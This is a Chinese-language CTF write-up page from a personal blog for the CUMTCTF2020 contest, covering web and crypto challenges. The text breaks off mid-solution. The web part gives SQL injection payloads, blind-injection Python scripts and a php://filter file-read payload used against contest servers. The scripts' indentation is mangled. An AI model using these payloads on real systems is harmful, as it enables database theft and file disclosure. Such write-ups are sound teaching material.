@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <meta name="renderer" content="webkit">
+
+  
+  <title>CUMTCTF2020 | Dragon&#39;s Blog</title>
+
+  <link rel="shortcut icon" href="/images/favicon.png">
+  <link rel="alternate" href="/atom.xml" title="Dragon's Blog">
+  <meta name="description" content="WebWeb签到一开始显示GET 1,所以传参?1&#x3D;1，然后显示POST 2，所以使用POST方法传入2&#x3D;2。 &lt;?php  error_reporting(0); if (!isset($_GET[&quot;1&quot;]))     die(&quot;Please Give me a GET 1 !&quot;); if (!isset($_POST[&quot;2&quot;])">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CUMTCTF2020">
+<meta property="og:url" content="https://devildragons.github.io/2020/09/25/CUMTCTF2020/index.html">
+<meta property="og:site_name" content="Dragon&#39;s Blog">
+<meta property="og:description" content="WebWeb签到一开始显示GET 1,所以传参?1&#x3D;1，然后显示POST 2，所以使用POST方法传入2&#x3D;2。 &lt;?php  error_reporting(0); if (!isset($_GET[&quot;1&quot;]))     die(&quot;Please Give me a GET 1 !&quot;); if (!isset($_POST[&quot;2&quot;])">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gj335hpjlwj30hi0e8ta0.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gj34g9hxu1j30tn0ig41r.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gj35a6hvxhj30vs089t92.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/007u7C9Rgy1gj36rgc8pdj30gc05nacv.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gj378xe8qlj30sa028mxe.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/007u7C9Rgy1gj37u7j8zfj316u0g7q5c.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/007u7C9Rgy1gj380b2uy0j314w058mxb.jpg">
+<meta property="article:published_time" content="2020-09-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-10-17T08:30:09.728Z">
+<meta property="article:author" content="灬魔龙">
+<meta property="article:tag" content="cumt">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gj335hpjlwj30hi0e8ta0.jpg">
+
+  <meta name="format-detection" content="telephone=no,email=no">
+  <meta name="theme-color" content="#9C27B0">
+  <meta name="description" content="">
+  <meta name="keywords" content=",cumt">
+
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="application-name" content="Dragon&#39;s Blog">
+  <meta name="msapplication-starturl" content="https://devildragons.github.io/2020/09/25/CUMTCTF2020/">
+  <meta name="msapplication-navbutton-color" content="#9C27B0">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-title" content="Dragon&#39;s Blog">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <link rel="apple-touch-icon" href="/images/favicon.png">
+
+  
+    <meta property="article:published_time" content="Fri Sep 25 2020 00:00:00 GMT+0800">
+    <meta property="article:modified_time" content="Sat Oct 17 2020 16:30:09 GMT+0800">
+  
+
+  
+    <link rel="canonical" href="https://devildragons.github.io/2020/09/25/CUMTCTF2020/">
+  
+
+  
+  
+
+  
+  
+  
+
+  
+<link rel="stylesheet" href="/css/mdui.css">
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Dragon's Blog" type="application/atom+xml">
+</head>
+<body class="mdui-appbar-with-toolbar mdui-drawer-body-left mdui-theme-primary-indigo mdui-theme-accent-pink">
+  <script>var a=localStorage.getItem("mdui-theme-layout-dark");if(a){document.getElementsByTagName("body")[0].className+=" mdui-theme-layout-dark"};</script>
+  <header id="header" class="mdui-appbar mdui-appbar-fixed mdui-appbar-scroll-hide mdui-appbar-inset">
+  <div class="mdui-toolbar mdui-color-theme">
+    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-drawer="{target: '#sidebar', swipe: true}"><i class="mdui-icon material-icons">menu</i></a>
+    <a href="/" class="mdui-typo-headline">Dragon&#39;s Blog</a>
+    <div class="mdui-toolbar-spacer"></div>
+    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-dialog="{target: '#search'}" mdui-tooltip="{content: '搜索'}"><i class="mdui-icon material-icons">search</i></a>
+    <a href="/atom.xml" class="mdui-btn mdui-btn-icon" mdui-tooltip="{content: 'RSS'}"><i class="mdui-icon material-icons">rss_feed</i></a>
+  </div>
+</header>
+<div class="mdui-dialog" id="search">
+  
+    <div class="search-form">
+      <input type="search" class="search-form-input" placeholder="输入关键词">
+    </div>
+    <div class="search-result" data-resource="/search.xml"></div>
+  
+</div>
+  <aside id="sidebar" class="mdui-drawer mdui-drawer-full-height">
+  <div class="mdui-grid-tile">
+    <img src="/images/banner.png" style="height: 160px;">
+    <img src="/images/touxiang.png" class="avatar-animation" style="position: absolute; top: 10%; left: 24px; width: 64px; height: 64px; border: 2px solid #fff; border-radius: 50%;">
+    <div class="mdui-grid-tile-actions">
+      <div class="mdui-grid-tile-text">
+        <div class="mdui-grid-tile-title">灬魔龙</div>
+        <div class="mdui-grid-tile-subtitle"><i class="mdui-icon material-icons">art_track</i></div>
+      </div>
+      
+    </div>
+  </div>
+
+  <div class="mdui-list" mdui-collapse="{accordion: true}">
+    <a href="/" class="mdui-list-item mdui-ripple">
+      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-blue">home</i>
+      <div class="mdui-list-item-content">主页</div>
+    </a>
+    <div class="mdui-collapse-item">
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-deep-orange">inbox</i>
+        <div class="mdui-list-item-content">归档</div>
+        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+        
+        <a class="mdui-ripple sidebar_archives-link" href="/archives/2020/09/">九月 2020<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/archives/2020/07/">七月 2020<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/archives/2020/06/">六月 2020<span class="mdui-ripple sidebar_archives-count">2</span></a>
+        
+      </div>
+    </div>
+    <div class="mdui-collapse-item">
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-green">chrome_reader_mode</i>
+        <div class="mdui-list-item-content">分类</div>
+        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+        
+        <a class="mdui-ripple sidebar_archives-link" href="/categories/acm/">acm<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/web/">web<span class="mdui-ripple sidebar_archives-count">4</span></a>
+        
+      </div>
+    </div>
+    <div class="mdui-collapse-item">
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-brown">bookmark</i>
+        <div class="mdui-list-item-content">标签</div>
+        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+        
+        <a class="mdui-ripple sidebar_archives-link" href="/tags/buuoj/" rel="tag">buuoj<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/tags/cumt/" rel="tag">cumt<span class="mdui-ripple sidebar_archives-count">3</span></a><a class="mdui-ripple sidebar_archives-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入<span class="mdui-ripple sidebar_archives-count">1</span></a>
+        
+      </div>
+    </div>
+    <a href="/about" class="mdui-list-item mdui-ripple">
+      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-purple">person</i>
+      <div class="mdui-list-item-content">关于</div>
+    </a>
+  </div>
+
+  <div class="mdui-divider"></div>
+
+  <div class="mdui-list" mdui-collapse="{accordion: true}">
+    
+      <a href="https://github.com/devildragons" target="_blank" rel="noopener" class="mdui-list-item mdui-ripple">Github</a>
+    
+    <div class="mdui-collapse-item">
+      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
+        <div class="mdui-list-item-content">友情链接</div>
+        <i class="mdui-list-item-icon mdui-icon material-icons">link</i>
+      </div>
+      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
+        
+          <a href="https://xzlxr.github.io/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">fe1w0</a>
+        
+          <a href="http://iyzyi.com/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">iyzyi</a>
+        
+          <a href="https://ljzjsc.com/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">牢记自己是菜</a>
+        
+          <a href="http://iv4n.cc/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">iv4n</a>
+        
+          <a href="https://3nd.xyz/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">3ND</a>
+        
+          <a href="https://skysec.top/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">一叶飘零</a>
+        
+          <a href="http://ueverglow.top/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">雨夜叶雨</a>
+        
+          <a href="http://iluem.xyz/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">iluem</a>
+        
+        
+      </div>
+    </div>
+  </div>
+</aside>
+  <main id="main" class="mdui-m-t-5 fadeIn animated">
+  
+<link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <style>#main article .mdui-card-content .center-block{display:block!important;margin-right:auto!important;margin-left:auto!important}</style>
+  <article class="mdui-card mdui-m-b-5">
+    <header class="mdui-card-media">
+      <img src="/images/random/material-8.png" style="max-height: 240px;">
+      <div class="mdui-card-media-covered">
+        <div class="mdui-card-primary">
+          <div class="mdui-card-primary-title">CUMTCTF2020</div>
+          <div class="mdui-card-primary-subtitle"><i class="iconfont">&#xe697;</i> 2020-09-25 / <i class="iconfont">&#xe601;</i> 灬魔龙 &nbsp;&nbsp; <span id="busuanzi_container_page_pv" style="display: none;"><i class="iconfont">&#xe7fd;</i> <span id="busuanzi_value_page_pv"></span></span></div>
+        </div>
+      </div>
+      <div class="mdui-card-menu">
+        
+          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#qrcode', align: 'right'}"><i class="mdui-icon material-icons">devices</i></button>
+          <ul class="mdui-menu" id="qrcode">
+            
+              <li class="mdui-menu-item"><a class="mdui-text-center mdui-ripple">Send to mobile phone</a></li>
+            
+            <li class="mdui-menu-item" disabled>
+              
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACbUlEQVR42u3aQXLDMAgFUN//0u0BMnY+YKlO+rTqZFzLTwvBAMfPV68DDw8PDw8PDw/vYbwjXmf/9fr72S/JO2/4Njw8PLwtvDdX7WDjV971MV0/H30bHh4e3kZe8lnJ1d87lOtPLxwZHh4e3oN5SXJ8tBYeHh7ef+BNEugPCAx4eHh4g2LEMVhnb054m2oteHh4eDFvkuau/ntrfw8PDw8v4JVHmooFiCTMPGimDA8PDy/g5RfxdTipNsPyFlqeoOPh4eHt4eUvyjdI3py8M3k+Sqnx8PDwbuWtS3yrA1gJLAozeHh4eIt5veS1V+qdsJen1Hh4eHiDYkR1s0mo6B3lqIyLh4eHN+Zdp9cJeNLs75GaowN4eHh4N/F6pOq4QLWoMXkbHh4e3mpefulfb5wMY/WS7Dyc4OHh4e3h5YWASWsqL+b2xgvw8PDw9vPyS7y6WRIAklS+8A14eHh4W3i91LZaqqg2yZJQVE6p8fDw8Ma8cpE0SI7ztln14KJwgoeHh7eYV01b502s+TDBm33x8PDwtvDyBlVSWu0VF5I0PUnW8fDw8Pbz8gJrr9TbK/sWmnZ4eHh4f8rrjQVMGlqTsQM8PDy8/bxrWN7cKresBkXeQmDAw8PDu4lXXXnLKjm+pDBRLYXg4eHhrebNm/q95lZ1LOCGmTI8PDy8W3lJMCi38IvNrSQwREePh4eHt5FXvdDLG8fBoPokHh4e3vN51bZWnihXyxx4eHh4n8WblGJ7SXaUyuPh4eFt5CXFiPyXXum2N2iFh4eHt593QwkguPR7ZeJqGwwPDw9vNe/7Fh4eHh4eHh4e3gPWLzjRr1siHHx5AAAAAElFTkSuQmCC">
+              
+            </li>
+          </ul>
+        
+        
+          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#share_menu', align: 'right'}"><i class="mdui-icon material-icons">share</i></button>
+          <ul class="mdui-menu" id="share_menu">
+            <li class="mdui-menu-item">
+              <a href="http://service.weibo.com/share/share.php?appkey=&title=CUMTCTF2020&url=https://devildragons.github.io/2020/09/25/CUMTCTF2020/&pic=https://devildragons.github.io/images/favicon.png&searchPic=false&style=simple" target="_blank" class="mdui-ripple">分享到微博</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="https://twitter.com/intent/tweet?text=CUMTCTF2020&url=https://devildragons.github.io/2020/09/25/CUMTCTF2020/&via=灬魔龙" target="_blank" class="mdui-ripple">分享到Twitter</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="https://www.facebook.com/sharer/sharer.php?u=https://devildragons.github.io/2020/09/25/CUMTCTF2020/" target="_blank" class="mdui-ripple">分享到Facebook</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="https://plus.google.com/share?url=https://devildragons.github.io/2020/09/25/CUMTCTF2020/" target="_blank" class="mdui-ripple">分享到Google+</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://devildragons.github.io/2020/09/25/CUMTCTF2020/&title=CUMTCTF2020" target="_blank" class="mdui-ripple">分享到LinkedIn</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="http://connect.qq.com/widget/shareqq/index.html?site=Dragon&#39;s Blog&title=CUMTCTF2020&summary=&pics=https://devildragons.github.io/images/favicon.png&url=https://devildragons.github.io/2020/09/25/CUMTCTF2020/" target="_blank" class="mdui-ripple">分享到QQ</a>
+            </li>
+            <li class="mdui-menu-item">
+              <a href="https://telegram.me/share/url?url=https://devildragons.github.io/2020/09/25/CUMTCTF2020/&text=CUMTCTF2020" target="_blank" class="mdui-ripple">分享到Telegram</a>
+            </li>
+          </ul>
+        
+      </div>
+    </header>
+    <div class="mdui-card-content mdui-typo">
+      <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Web签到"><a href="#Web签到" class="headerlink" title="Web签到"></a>Web签到</h2><p>一开始显示GET 1,所以传参?1=1，然后显示POST 2，所以使用POST方法传入2=2。</p>
+<pre><code>&lt;?php 
+error_reporting(0);
+if (!isset($_GET[&quot;1&quot;]))
+    die(&quot;Please Give me a GET 1 !&quot;);
+if (!isset($_POST[&quot;2&quot;]))
+    die(&quot;Please Give me a POST 2 !!&quot;);
+highlight_file(__FILE__);
+if (isset($_GET[&quot;file&quot;]))
+    echo file_get_contents($_GET[&quot;file&quot;]);
+//Where is the flag?
+?&gt;</code></pre><p>看到题目代码，有文件包含语句，最后构造GET:?1=1&amp;file=flag.php和POST:2在Elements中获得flag。</p>
+<h2 id="Babysqli"><a href="#Babysqli" class="headerlink" title="Babysqli"></a>Babysqli</h2><p>查看源码，发现提示</p>
+<pre><code>&lt;!-- select * from users where user=&apos;$username&apos; and password=&apos;$password&apos; --&gt;</code></pre><p>经过测试发现本题过滤了空格，所以可以使用/<strong>/绕过。<br>POST构造语句`username=admin&amp;password=’or/</strong>/1#`<br><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gj335hpjlwj30hi0e8ta0.jpg" alt=""><br>题目出现回显。<br>这题有三种解法，一是报错注入，二是联合注入，三是盲注。</p>
+<p>报错注入：</p>
+<pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,database()))#&amp;username=admin</code></pre><p>爆出数据库cumtctf。</p>
+<pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;cumtctf&quot;)))#&amp;username=admin</code></pre><p>爆出表名users。</p>
+<pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,(select/**/concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;users&quot;/**/limit/**/4,1)))#&amp;username=admin</code></pre><p>爆出列名password。</p>
+<pre><code>password=&apos;or/**/extractvalue(1,concat(&apos;~&apos;,(select/**/concat(password)/**/from/**/users/**/limit/**/7,1)))#&amp;username=admin</code></pre><p>获得flag。</p>
+<p>联合注入：</p>
+<pre><code>password=&apos;/**/union/**/select/**/1,2,3,password,5,6,7,8/**/from/**/users#&amp;username=admin</code></pre><p>盲注：</p>
+<pre><code>import requests
+url = &quot;http://202.119.201.197:13003/&quot;
+
+data = {&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;&quot;}
+result = &quot;&quot;
+i = 0
+while( True ):
+i = i + 1 
+head=32
+tail=127
+
+while( head &lt; tail ):
+    mid = (head + tail) // 2
+    payload = &quot;\&apos;or/**/if(ord(mid((select/**/group_concat(password)/**/from/**/users),%d,1))&gt;%d,1,0)#&quot;%(i,mid)
+
+
+    data[&apos;password&apos;] = payload
+    r = requests.post(url,data=data)
+
+    if &quot;Hello&quot; in r.text :
+        head = mid + 1
+    else:
+        tail = mid
+
+last = result
+
+if chr(head)!=&apos;&apos;:
+    result += chr(head)
+else:
+    break
+print(result)</code></pre><h2 id="Secret"><a href="#Secret" class="headerlink" title="Secret"></a>Secret</h2><p>打开只看到一张图片，打开源码也没有什么，将图片下载下来，打开发现源码。</p>
+<pre><code>&lt;?php
+error_reporting(0);
+include_once(&apos;flag.php&apos;);
+if(isset($_GET[&apos;param1&apos;]))
+{
+$str1=$_GET[&apos;param1&apos;];
+if(file_get_contents($str1)!==&apos;Suvin_wants_a_girlfriend&apos;)
+    die(&quot;Suvin doesn&apos;t like you&quot;);
+if(isset($_GET[&apos;param2&apos;])){
+    $str2=$_GET[&apos;param2&apos;];
+    if(!is_numeric($str2))
+        die(&apos;Suvin prefers strings of Numbers&apos;);
+    else if($str2&lt;3600*24*30)
+        die(&apos;Suvin says the num is too short&apos;);
+    else if($str2&gt;3600*24*31)
+        die(&apos;Suvin says the num is too long&apos;);
+    else {
+        echo &quot;Suvin says he&apos;s falling in love with you!&quot;.&quot;&lt;/br&gt;&quot;;
+        sleep(intval($str2)); 
+    }
+    if (isset($_POST[&apos;param1&apos;]) &amp;&amp; isset($_POST[&apos;param2&apos;])) {
+        $str1=$_POST[&apos;param1&apos;];
+        $str2=$_POST[&apos;param2&apos;];
+        if(strlen($str1)&gt;1000)
+            die(&quot;It&apos;s too long&quot;);
+        if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))
+            echo $flag;
+        else 
+            die(&quot;It&apos;s so similar to md5&quot;);
+    }
+}
+}</code></pre><p>审计代码可知有三个需要绕过的点。</p>
+<p>第一个，file_get_contents漏洞，需要我们传入一个文件并且文件内容为Suvin_wants_a_girlfriend。本题没有符合该内容的文件，所以使用data伪协议。<br>构造：?param1=data://text/plain;base64,U3V2aW5fd2FudHNfYV9naXJsZnJpZW5k</p>
+<p>第二个是要让str2=2592000,直接输入2592000的话，会下面的sleep函数，需要等很久，但是sleep(intval($str2))可以采用别的方法绕过，输入param2=2.592e6，只需要sleep(2.592)即可。</p>
+<p>第三个便是</p>
+<pre><code>if(((string)$str1!==(string)$str2)&amp;&amp;(sha1($str1)===sha1($str2)))
+echo $flag;</code></pre><p>sha1进行强比较时是可以通过数组绕过的，但是这里将数据进行了强制转换，所以用数组前半部分就不能通过判断。<br>所以需要找到sha1碰撞。</p>
+<p>参考：<a href="https://blog.csdn.net/caiqiiqi/article/details/68953730" target="_blank" rel="noopener">https://blog.csdn.net/caiqiiqi/article/details/68953730</a></p>
+<p><img src="https://tvax3.sinaimg.cn/large/007u7C9Rgy1gj34g9hxu1j30tn0ig41r.jpg" alt=""><br>用浏览器POST错误，所以使用burpsuite传参获得flag。</p>
+<h2 id="Babysqli2"><a href="#Babysqli2" class="headerlink" title="Babysqli2"></a>Babysqli2</h2><p>这题没有回显，所以使用盲注。</p>
+<pre><code>&lt;!-- select * from users where user=&apos;$username&apos; and password=&apos;$password&apos; --&gt;</code></pre><p>查询语句和sql1一样，发现本题引号被过滤了，所以构造 <code>username=admin\&amp;password=or/**/1#</code>，\将单引号转义，显示Login success成功绕过。</p>
+<pre><code>import requests
+url = &quot;http://202.119.201.197:13004/&quot;
+
+data = {&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;}
+result = &quot;&quot;
+i = 0
+while( True ):
+i = i + 1 
+head=32
+tail=127
+
+while( head &lt; tail ):
+    mid = (head + tail) // 2
+    payload = &quot;or/**/if(ord(right((select/**/group_concat(password)/**/from/**/users),%d))&gt;%d,1,0)#&quot;%(i,mid)
+
+
+    data[&apos;password&apos;] = payload
+    r = requests.post(url,data=data)
+
+    if &quot;Login success&quot; in r.text :
+        head = mid + 1
+    else:
+        tail = mid
+
+last = result
+
+if chr(head)!=&apos;&apos;:
+    result += chr(head)
+else:
+    break
+print(result)</code></pre><p>本题过滤了substr,substring和mid。所以只能用left或者right函数截取字符，这里的脚本用right函数跑出的结果是倒序的，逆转一下即可。</p>
+<h2 id="简单的文件包含？"><a href="#简单的文件包含？" class="headerlink" title="简单的文件包含？"></a>简单的文件包含？</h2><p>进去界面提示需要来自本地。<br>抓包增加X-Forwarded-For:127.0.0.1，提示</p>
+<pre><code>Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive</code></pre><p>将X-Forwarded-For修改为Client-ip绕过。</p>
+<pre><code>&lt;?php
+if ($_SERVER[&apos;HTTP_CLIENT_IP&apos;] != &apos;127.0.0.1&apos; &amp;&amp; $_SERVER[&apos;HTTP_X_REAL_IP&apos;] != &apos;127.0.0.1&apos;){
+    if ($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;] == &quot;127.0.0.1&quot;) {
+        die(&quot;Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive&quot;);
+    }
+    die(&quot;Sorry, this site is only optimized for those who comes from localhost&quot;);
+}
+show_source(__FILE__);
+include_once(&quot;flag.php&quot;);
+if(isset($_POST[&apos;f&apos;])) 
+  include_once($_POST[&apos;f&apos;]);</code></pre><p>题目给出了源码。<br>发现这题和wmctf2020的Make PHP Great Again类似。<br>/proc/self指向当前进程的/proc/pid/，/proc/self/root/是指向/的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过。</p>
+<p>payload:</p>
+<pre><code>f=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</code></pre><p><img src="https://tvax1.sinaimg.cn/large/007u7C9Rgy1gj35a6hvxhj30vs089t92.jpg" alt=""></p>
+<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="幼儿园的密码学"><a href="#幼儿园的密码学" class="headerlink" title="幼儿园的密码学"></a>幼儿园的密码学</h2><pre><code># e = 0x10001
+# n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f
+# c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d
+
+# Hint ： google RSA</code></pre><p>将n转为10进制得    <code>n=106521084065274837947153338013414677016150003618052696631715598225251903811631</code><br>在factordb.com网站分解得</p>
+<pre><code>p=324350545929838254331191385863847627003
+q=328413456989577256301798468872388310877</code></pre><p>脚本：</p>
+<pre><code>import gmpy2
+import libnum
+e = 0x10001
+n = 0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f
+c = 0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d
+p=324350545929838254331191385863847627003
+q=328413456989577256301798468872388310877
+phi=(p-1)*(q-1)
+d=gmpy2.invert(e,phi)
+m=pow(c,d,n)
+print(libnum.n2s(m))</code></pre><h2 id="小学生的密码题"><a href="#小学生的密码题" class="headerlink" title="小学生的密码题"></a>小学生的密码题</h2><pre><code>from Secret import flag
+def encode(ptext):
+dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]
+m = [i for i in ptext]
+tmp = [];s = []
+for i in range(len(m)):
+    for j in range(len(dic)):
+        if m[i] == dic[j]:
+            tmp.append(j + 1)
+for i in tmp:
+    res = &quot;&quot;
+    if i &gt;= 8:
+        res += int(i/8)*&quot;8&quot;
+    if i%8 &gt;=4:
+        res += int(i%8/4)*&quot;4&quot;
+    if i%4 &gt;=2:
+        res += int(i%4/2)*&quot;2&quot;
+    if i%2 &gt;= 1:
+        res += int(i%2/1)*&quot;1&quot;
+    s.append(res + &quot;0&quot;)
+print (&quot;&quot;.join(s)[:-1])
+encode(flag)
+#2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841</code></pre><p>发现是云影密码。</p>
+<pre><code>def de_code(c):
+dic = [chr(i) for i in range(ord(&quot;A&quot;), ord(&quot;}&quot;) + 1)]
+flag = []
+c2 = [i for i in c.split(&quot;0&quot;)]
+for i in c2:
+    c3 = 0
+    for j in i:
+        c3 += int(j)
+    flag.append(dic[c3 - 1])
+return flag
+s=de_code(&quot;2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841&quot;)
+print(s)</code></pre><p>参考：<a href="https://blog.csdn.net/lilongsy/article/details/108483119" target="_blank" rel="noopener">https://blog.csdn.net/lilongsy/article/details/108483119</a></p>
+<h2 id="初中生的密码题"><a href="#初中生的密码题" class="headerlink" title="初中生的密码题"></a>初中生的密码题</h2><pre><code>from Crypto.Util.number import *
+flag = b&quot;CUMTCTF{***********}&quot;
+
+m = bytes_to_long(flag)
+p = getPrime(2048)
+q = getPrime(2048)
+n=p*q
+print(&quot;n =&quot;)
+print(n)
+print(&quot;x =&quot;)
+print(p - q)
+e = 65537
+print(&quot;e =&quot;)
+print (e)
+enc = pow (m,e,n)
+print(&quot;c =&quot;)
+print (enc)
+
+
+# 848636981711330203910533960833570455347986345690792054016750216327432282027653737545502731789145875082064910377585125307004316982829408169391535303284775605083341204318559328114199464933306718077358184455649201353500348066849356092072732731595459583112558025395897556853371526959018489282157258240657926428930442774978485014507505784476690845099227369478496626645851076679385883251594929952035661085961598388544126711902983065521128172978259778754970695037278639045266353840536697343675638366506183715240679610094431082173271579344392346412454309134164388560354168918421706979410826758333952277436780339926907679282601846125790204266958409253210507301575619878252146515542791259716201124558373197816421305046774535734189567481599690381428371580696486054135486182509762880877363356256116336930055483318415453999460475103494980748558993889459677374574910745242385711928489669790527969454801533682757508950065697410745338257289717598141031203566419840587221470340637486034911686587695890702753064441476917845870069997649577034149354150224132983093069444866234262542625997399303875938451386377357399819123134018307163799151847997740448433278364764592560369020005024859119937315831252233159882960532854116233641920659786799836075681746397
+
+# -3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636
+
+# 65537
+
+# 500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609</code></pre><p><code>phi=(p-1)*(q-1)=pq-(p+q)+1</code>，所以要构造p+q，题目